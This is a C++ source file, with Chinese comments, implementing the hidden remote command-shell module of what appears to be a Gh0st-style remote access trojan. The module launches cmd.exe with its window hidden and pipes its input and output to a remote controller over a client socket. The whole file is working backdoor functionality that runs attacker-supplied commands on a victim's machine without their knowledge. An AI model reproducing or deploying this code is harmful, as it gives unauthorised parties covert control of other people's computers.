// ShellManager.cpp: implementation of the CShellManager class.
//
//////////////////////////////////////////////////////////////////////
#include "..\pch.h"
#include "ShellManager.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CShellManager::CShellManager(CClientSocket *pClient):CManager(pClient)
{
    SECURITY_ATTRIBUTES  sa = {0};	//安全描述符
	STARTUPINFO          si = {0};
	PROCESS_INFORMATION  pi = {0}; 
	char  strShellPath[MAX_PATH] = {0};

    m_hReadPipeHandle	= NULL;
    m_hWritePipeHandle	= NULL;
	m_hReadPipeShell	= NULL;
    m_hWritePipeShell	= NULL;
    sa.nLength = sizeof(sa);
    sa.lpSecurityDescriptor = NULL; 
    sa.bInheritHandle = TRUE;

	//创建管道，管道用于获取cmd的数据信息
    if(!CreatePipe(&m_hReadPipeHandle, &m_hWritePipeShell, &sa, 0))
	{
		if(m_hReadPipeHandle != NULL)	CloseHandle(m_hReadPipeHandle);
		if(m_hWritePipeShell != NULL)	CloseHandle(m_hWritePipeShell);
		return;
    }
	//创建管道，管道用于获取cmd的数据信息
    if(!CreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0)) 
	{
		if(m_hWritePipeHandle != NULL)	CloseHandle(m_hWritePipeHandle);
		if(m_hReadPipeShell != NULL)	CloseHandle(m_hReadPipeShell);
		return;
    }

	memset((void *)&si, 0, sizeof(si));
    memset((void *)&pi, 0, sizeof(pi));

	GetStartupInfo(&si);
	si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = SW_HIDE;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput  = m_hReadPipeShell;//将管道赋值
    si.hStdOutput = si.hStdError = m_hWritePipeShell; 

	GetSystemDirectory(strShellPath, MAX_PATH);
	strcat(strShellPath,"\\cmd.exe");

	//创建CMD进程，指定管道
	if (!CreateProcess(strShellPath, NULL, NULL, NULL, TRUE, 
		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) 
	{
		CloseHandle(m_hReadPipeHandle);
		CloseHandle(m_hWritePipeHandle);
		CloseHandle(m_hReadPipeShell);
		CloseHandle(m_hWritePipeShell);
		return;
    }
	m_hProcessHandle = pi.hProcess;
	m_hThreadHandle	= pi.hThread;

	//标志，代表 shell功能
	BYTE	bToken = TOKEN_SHELL_START;
	//通知准备就绪
	Send((LPBYTE)&bToken, 1);
	WaitForDialogOpen();

	//创建读取管道数据的线程
	m_hThreadRead = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ReadPipeThread, (LPVOID)this, 0, NULL);
	//创建一个等待线程 等待管道被关闭，终端结束操作
	m_hThreadMonitor = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorThread, (LPVOID)this, 0, NULL);
}

CShellManager::~CShellManager()
{
	TerminateThread(m_hThreadRead, 0);
	TerminateProcess(m_hProcessHandle, 0);
	TerminateThread(m_hThreadHandle, 0);
	WaitForSingleObject(m_hThreadMonitor, 2000);
	TerminateThread(m_hThreadMonitor, 0);

	if (m_hReadPipeHandle != NULL)
		DisconnectNamedPipe(m_hReadPipeHandle);
	if (m_hWritePipeHandle != NULL)
		DisconnectNamedPipe(m_hWritePipeHandle);
	if (m_hReadPipeShell != NULL)
		DisconnectNamedPipe(m_hReadPipeShell);
	if (m_hWritePipeShell != NULL)
		DisconnectNamedPipe(m_hWritePipeShell);

    CloseHandle(m_hReadPipeHandle);
    CloseHandle(m_hWritePipeHandle);
    CloseHandle(m_hReadPipeShell);
    CloseHandle(m_hWritePipeShell);

    CloseHandle(m_hProcessHandle);
	CloseHandle(m_hThreadHandle);
	CloseHandle(m_hThreadMonitor);
    CloseHandle(m_hThreadRead);
}

void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		//接受消息设置信号打开，然后上面的WaitForDialogOpen();执行后续操作
		NotifyDialogIsOpen();
		return;
	}
	
	unsigned long	ByteWrite;
	//写入管道数据
	WriteFile(m_hWritePipeHandle, lpBuffer, nSize, &ByteWrite, NULL);
}


//读取CMD的输出数据线程函数
DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lparam)
{
	unsigned long   BytesRead = 0;
	char	ReadBuff[1024];
	DWORD	TotalBytesAvail;
	CShellManager *pThis = (CShellManager *)lparam;
	while (1)
	{
		Sleep(100);

		//判断是否与数据以及数据大小
		while (PeekNamedPipe(pThis->m_hReadPipeHandle, ReadBuff, sizeof(ReadBuff), &BytesRead, &TotalBytesAvail, NULL)) 
		{
			//没有跳出循环
			if (BytesRead <= 0)
				break;
			memset(ReadBuff, 0, sizeof(ReadBuff));
			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, TotalBytesAvail);
			//读取管道数据
			ReadFile(pThis->m_hReadPipeHandle, lpBuffer, TotalBytesAvail, &BytesRead, NULL);
			// 发送数据 ---->OnReceive会接受数据
			pThis->Send(lpBuffer, BytesRead);
			LocalFree(lpBuffer);
		}
	}
	return 0;
}


//等待结束，清理线程关闭链接
DWORD WINAPI CShellManager::MonitorThread(LPVOID lparam)
{
	CShellManager *pThis = (CShellManager *)lparam;
	HANDLE hThread[2];
	hThread[0] = pThis->m_hProcessHandle;
	hThread[1] = pThis->m_hThreadRead;
	WaitForMultipleObjects(2, hThread, FALSE, INFINITE);

	//关闭上面的CMD循环读取数据的线程
	TerminateThread(pThis->m_hThreadRead, 0);
	TerminateProcess(pThis->m_hProcessHandle, 1);
	pThis->m_pClient->Disconnect();
	return 0;
}
